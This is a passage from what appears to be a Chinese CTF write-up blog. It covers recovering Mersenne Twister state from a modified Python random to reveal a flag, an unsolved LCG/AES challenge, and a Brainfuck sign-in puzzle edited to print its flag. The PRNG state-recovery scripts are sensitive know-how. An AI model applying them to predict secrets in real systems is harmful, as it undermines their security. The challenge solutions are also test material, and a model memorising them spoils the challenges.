class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_randbelow_with_getrandbits</span>(<span class="params">self, n</span>):  </span><br><span class="line">    <span class="string">&quot;Return a random int in the range [0,n).  Defined for n &gt; 0.&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    getrandbits = self.getrandbits  </span><br><span class="line">    k = n.bit_length()  <span class="comment"># don&#x27;t use (n-1) here because n can be 1  </span></span><br><span class="line">    r = getrandbits(k)  <span class="comment"># 0 &lt;= r &lt; 2**k  </span></span><br><span class="line">    <span class="keyword">while</span> r &gt;= n:  </span><br><span class="line">        r = getrandbits(k)  </span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure><br>修改后是这样的：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_randbelow_with_getrandbits</span>(<span class="params">self, n</span>):  </span><br><span class="line">    <span class="string">&quot;Return a random int in the range [0,n).  Defined for n &gt; 0.&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    getrandbits = self.getrandbits  </span><br><span class="line">    k = n.bit_length() - <span class="number">1</span>  </span><br><span class="line">    r = getrandbits(k)  <span class="comment"># 0 &lt;= r &lt; 2**k  </span></span><br><span class="line">    <span class="keyword">while</span> r &gt;= n:  </span><br><span class="line">        r = getrandbits(k)  </span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure><br>其实就是将<code>k = n.bit_length()</code>修改成了<code>k = n.bit_length() - 1</code>，再看到题目主要使用的<code>choice</code>函数实现如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">self, seq</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Choose a random element from a non-empty sequence.&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># As an accommodation for NumPy, we don&#x27;t use &quot;if not seq&quot;  </span></span><br><span class="line">    <span class="comment"># because bool(numpy.array()) raises a ValueError.    if not len(seq):  </span></span><br><span class="line">        <span class="keyword">raise</span> IndexError(<span class="string">&#x27;Cannot choose from an empty sequence&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> seq[self._randbelow(<span class="built_in">len</span>(seq))]</span><br></pre></td></tr></table></figure><br>如果用原来的代码的话在进行<code>rand.choice(test)</code>的时候<code>_randbelow_with_getrandbits</code>就会生成9-bits的随机数，若大于等于256就会重新选取，这样的话得到的状态是不连续的，就没有办法恢复状态并倒推了，所以将<code>k = n.bit_length()</code>修改成了<code>k = n.bit_length() - 1</code>就可以避免这种情况，恢复状态的话GitHub上<a href="https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver">这个项目</a>就可以做到，通过下述代码就可以恢复状态并实现倒推：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;MT19937-Symbolic-Execution-and-Solver/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line"></span><br><span class="line">r = [...]</span><br><span class="line">r = [<span class="number">255</span> - x <span class="keyword">for</span> x <span class="keyword">in</span> r]</span><br><span class="line"></span><br><span class="line">rng_clone = MT19937(state_from_data = (r, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">length = enc.bit_length()</span><br><span class="line"></span><br><span class="line">rng_clone.reverse_states(length//<span class="number">32</span>+<span class="number">1</span>) <span class="comment"># 括号内参数是要倒推的状态数</span></span><br></pre></td></tr></table></figure><br>恢复状态之后则需要通过手写<code>getrandbits</code>函数来得到（那个项目并没有实现这个功能），根据random库中<code>getrandbits</code>的规则实现<code>getrandbits</code>如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">n</span>):</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">32</span>:</span><br><span class="line">        out = rng_clone() &lt;&lt; offset | out</span><br><span class="line">        n -= <span class="number">32</span></span><br><span class="line">        offset += <span class="number">32</span></span><br><span class="line">    out = rng_clone() &gt;&gt; (<span class="number">32</span> - n) &lt;&lt; offset | out</span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><br>最终可以直接恢复出flag：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mask = getrandbits(length + <span class="number">3</span>) <span class="comment"># 需要测试，因为不知道原来的位数是多少，只知道密文的位数</span></span><br><span class="line">pt = enc ^^ mask </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(pt))</span><br></pre></td></tr></table></figure></p><h3 id="prng-xxxx（待复现）"><a href="#prng-xxxx（待复现）" class="headerlink" title="prng_xxxx（待复现）"></a>prng_xxxx（待复现）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, b, seed  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b</span>):  </span><br><span class="line">        self.seed = seed  </span><br><span class="line">        self.a = a  </span><br><span class="line">        self.b = b  </span><br><span class="line">        self.m = <span class="number">2</span>**<span class="number">128</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):  </span><br><span class="line">        self.seed = (self.seed * self.a + self.b) % self.m  </span><br><span class="line">        <span class="keyword">return</span> (self.seed &gt;&gt; <span class="number">64</span>) ^ (self.seed % <span class="number">2</span>**<span class="number">64</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lfsr</span>:  </span><br><span class="line">    <span class="comment"># 我被裁了/(ㄒoㄒ)/~~  </span></span><br><span class="line">    <span class="keyword">pass</span>  </span><br><span class="line">  </span><br><span class="line">a = <span class="number">47026247687942121848144207491837523525</span>  </span><br><span class="line"><span class="keyword">assert</span> b &lt; <span class="number">2</span>**<span class="number">128</span> <span class="keyword">and</span> seed &lt; <span class="number">2</span>**<span class="number">128</span>  </span><br><span class="line">lcg = LCG(seed, a, b)  </span><br><span class="line"><span class="built_in">print</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">0</span>] * <span class="number">64</span>])  </span><br><span class="line"><span class="built_in">print</span>(AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>)))  </span><br></pre></td></tr></table></figure><p>参考论文：<a href="https://tosc.iacr.org/index.php/ToSC/article/view/8700/8292">View of Practical seed-recovery for the PCG Pseudo-Random Number Generator</a></p><p><del>听说预期解的exp也要跑一个小时，有闲情雅致再复现</del></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><p>经典Brainfuck，美化代码如下：<br><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">&gt;<span class="literal">+++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br></pre></td></tr></table></figure><br>可以知道这里在地址为0处写入数据之后会将它擦除，所以可以在擦除之前将地址为0的数据打印出来，修改代码如下：<br><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">&gt;<span class="literal">+++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span 